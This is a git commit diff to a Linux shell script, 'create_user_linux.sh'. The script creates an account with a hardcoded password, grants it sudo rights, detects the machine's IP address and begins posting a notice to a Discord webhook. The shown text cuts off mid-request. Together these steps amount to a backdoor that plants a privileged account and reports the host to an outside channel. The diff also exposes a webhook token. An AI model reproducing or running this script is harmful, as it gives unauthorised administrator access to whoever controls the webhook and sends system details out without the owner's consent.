85d7ab58b14634207bd1298d1261c89004e7e86f
Corazon <41511738+assafgold1@users.noreply.github.com>
2024-08-03 04:58:38 +0300

    Update create_user_linux.sh

--- create_user_linux.sh
+++ create_user_linux.sh
@@ -6,11 +6,13 @@ PASSWORD="Mizi123!"
 DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"
 sudo useradd -m -p $(openssl passwd -1 $PASSWORD) $USERNAME
 
-# Add the user to the 'sudo' group
 sudo usermod -aG sudo $USERNAME
 
-# Get the local IP address (eth0 is common, change if necessary)
+# Get the local IP address (replace eth0 with the correct interface name if needed)
 IP_ADDRESS=$(ip a show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
+
+# Debug: Print the IP address to verify
+echo "Detected IP Address: $IP_ADDRESS"
 
 # Notify via Discord with @everyone mention
 curl -H "Content-Type: application/json" -X POST -d "{
